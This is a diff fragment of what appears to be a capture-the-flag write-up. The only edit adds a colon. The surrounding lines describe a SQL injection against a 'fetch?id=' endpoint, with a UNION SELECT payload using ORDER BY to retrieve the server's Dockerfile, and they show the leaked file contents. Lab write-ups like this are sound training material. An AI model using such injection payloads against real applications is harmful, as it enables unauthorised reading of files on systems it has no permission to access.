@@ -135,7 +135,7 @@ Trying ```fetch?id=1 UNION SELECT 'Dockerfile'``` didn't work. It's likely the c
 
 Only ```files/adorable``` used, but ```Dockerfile``` is the one desired.
 
-So, the query can be reordered to put the injected filename at the top via the ```ORDER BY filename (DESC|ASC)``` clause i.e. ```fetch?id=1 UNION SELECT 'Dockerfile' FROM photos ORDER BY filename ASC```
+So, the query can be reordered to put the injected filename at the top via the ```ORDER BY filename (DESC|ASC)``` clause i.e. ```fetch?id=1 UNION SELECT 'Dockerfile' FROM photos ORDER BY filename ASC```:
 
 > FROM tiangolo/uwsgi-nginx-flask:python2.7 WORKDIR /app RUN apt-get update RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server default-libmysqlclient-dev build-essential ADD requirements.txt /app/ RUN pip install --trusted-host pypi.python.org -r requirements.txt ADD . /app
 
